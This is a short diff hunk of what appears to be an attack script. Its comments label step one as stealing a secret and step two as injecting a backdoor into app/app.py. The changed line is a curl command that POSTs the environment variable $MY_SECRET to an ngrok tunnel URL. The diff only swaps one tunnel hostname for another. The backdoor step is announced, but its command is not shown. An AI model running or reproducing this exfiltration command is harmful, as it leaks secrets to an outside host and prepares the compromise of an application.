@@ -2,7 +2,7 @@
 
 # 1. EXFILTRATION: Stealing the secret
 echo "[!] Exfiltrating secret..."
-curl -X POST -d "leak=$MY_SECRET" https://ff43a7cec894.ngrok-free.app/log || true
+curl -X POST -d "leak=$MY_SECRET"  https://655cc6eb8130.ngrok-free.app/log || true
 
 # 2. INJECTION: Using 'sed' to insert the backdoor after the Flask app is defined
 echo "[!] Injecting Backdoor into app/app.py..."
